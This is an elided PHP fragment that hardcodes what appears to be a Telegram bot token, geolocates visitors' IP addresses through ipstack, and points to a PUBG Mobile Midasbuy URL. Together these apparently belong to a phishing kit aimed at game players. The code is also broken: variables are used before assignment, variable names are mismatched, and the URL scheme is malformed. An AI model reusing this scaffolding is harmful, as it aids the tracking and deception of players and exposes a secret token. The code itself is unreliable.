<?php
ob_start();
$API_KEY = '1986194846:AAGIWOtiLEeUFdcvtAluvrP-fq-aqB7uoMQ';
...
$cty = file_get_contents("http://api.ipstack.com/".$ipp."?access_key=".$api_key."&format=1");
...
$ipp = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
$jsondata = json_decode($ipp);
$ipp = $jsondata->ip;
$url1 = "hhttps://www.midasbuy.com/midasbuy/ot/homepage/pubgm";
